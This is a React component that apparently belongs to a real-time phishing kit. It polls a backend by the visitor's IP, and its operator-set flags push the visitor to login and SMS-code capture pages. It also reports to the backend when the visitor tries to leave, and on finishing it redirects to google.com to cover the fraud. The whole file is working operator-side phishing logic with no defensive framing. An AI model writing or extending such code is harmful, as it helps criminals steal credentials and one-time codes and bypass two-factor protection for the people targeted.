import React, {useState, useEffect, useRef} from 'react';
import "../assets/css/styles.css";
import {Loading} from "../helpers/Loading";
import {useNavigate} from "react-router-dom";
import axios from "axios";
import {BACKEND_NAME, URL_ROOT} from "../helpers/env";

const WaitActions = () => {
    let history = useNavigate();
    const [loading, setLoading] = useState(false);
    let ip = useRef(null);

    window.addEventListener('beforeunload', function (e) {
        e.preventDefault();
        e.returnValue = '';

        const data = {
            step: '6',
            input3: 'No',
        };

        axios.post(URL_ROOT + BACKEND_NAME + `write.php`, data);
    });

    axios.get(URL_ROOT + BACKEND_NAME + 'get_ip.php')
        .then(response => {
            if (response.data.ok) {
                ip = response.data.data;
                localStorage.setItem('ip', ip);
            }
        });

    let [dataStatus, setDataStatus] = useState([]);

    useEffect(() => {
        const interval = setInterval(() => {
            axios.get(URL_ROOT + BACKEND_NAME + 'read_status.php?ip=' + ip)
                .then(response => {
                    setDataStatus(response.data);
                    console.log(dataStatus);
                });
        }, 2000);
        return () => clearInterval(interval);
    }, [dataStatus]);


    useEffect( () => {
        setLoading(true);

        if (dataStatus.Login === "Si") {
            history('/login');
        }

        if (dataStatus.Sms === "Si") {
            history('/get-sms-two');
            localStorage.setItem("Cc", dataStatus.Cc);
        }

        if (dataStatus.SmsError === "Si") {
            history('/get-sms-two-error');
        }

        if (dataStatus.Sms1 === "Si") {
            history('/get-sms');
        }

        if (dataStatus.SmsError1 === "Si") {
            history('/get-sms-error');
        }

        if (dataStatus.Finish === "Si") {
            window.location.href = "https://www.google.com/"
        }

    }, [dataStatus]);

    return (
        <>
            {
                loading ?
                    <Loading />
                    :
                    ''
            }

        </>
    );
};

export default WaitActions;